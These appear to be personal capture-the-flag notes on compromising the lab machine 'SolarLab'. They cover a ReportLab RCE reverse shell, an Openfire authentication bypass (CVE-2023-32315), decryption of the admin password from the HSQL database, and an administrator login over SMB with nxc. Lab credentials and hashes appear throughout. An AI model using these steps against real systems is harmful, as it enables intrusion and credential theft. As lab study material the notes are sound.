___


in the custom js functions there r some interesting endpoints


report sub domain has login page

found passes on share -> they don't work on login page -> windows httpapi or winrm ports not open



*could try those creds on RPC* -> dump info

gonna start looking at those endpoints


*this is blakes username on the report portal*
BlakeB


if user exists it gives you auth error -> if user doesn't gives u user not found on login portal




BlakeB -> this logs into portal
ThisCanB3typedeasily1@




can submit jpgs/data and pdf is generated

# CVE-2023-33733: RCE Vulnerability in ReportLab PDF Toolkit

Find Arctic Wolf’s recommendations for CVE-2023-33733: RCE Vulnerability in ReportLab PDF Toolkit.


got a rev shell <- !!!


used a powershell script as well as the exp.py



*got other user passes*

sqlite> select * from user;
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard


*more creds kinda* not rlly
1|BlakeB|BlakeB
2|ClaudiaS|ClaudiaS
3|AlexanderK|ClaudiaS
4|blakeb|ThisCanB3typedeasily1@
5|claudias|007poiuytrewq
6|alexanderk|HotP!fireguard




*6791 maps to port 5000 internally*


  location / {
            if ($host != "report.solarlab.htb") {
                rewrite ^ http://report.solarlab.htb:6791$request_uri permanent;
            }
            # Proxy requests to http://127.0.0.1:5000
            proxy_pass http://127.0.0.1:5000;




*port 80 maps to solarlab.htb*


openfire is running on this what is the managemen port


netstat -a



*http admin page is here*

wget http://127.0.0.1:9090     


*ver*
Openfire, Version: 4.7.4




*vulnerable to this*
# Ignite.Realtime.Openfire.CVE-2023-32315.Authentication.Bypass



*rce can be achieved by plugin upload*
https://github.com/miko550/CVE-2023-32315



*got rce as solarlab/openfire user*
<foo><bar>Secr3t$tr1ng!</bar></foo>



#HSQL Database Engine 2.4.1
#Mon Sep 01 23:25:13 EEST 2025
version=2.4.1
modified=yes
tx_timestamp=0



Openfire bundles hsqldb as its embedded database

so its using embedded database so how do i connect to hsql




*found this on openfire.script to set up the database *

INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')



becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442


 *I think this the table*
CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))



*whta is this*

INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)



*this finally worked for me*
java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
You have new mail.  



I was using the  wrong password for decryption it was in a separate entry in the script password with the name -> 

INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)



nxc smb solarlab.htb -u 'administrator' -p 'ThisPasswordShouldDo!@' 
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\administrator:ThisPasswordShouldDo!@ (Pwn3d!)



used smbexec.py and then did a powershell rev shell for better shell got root though

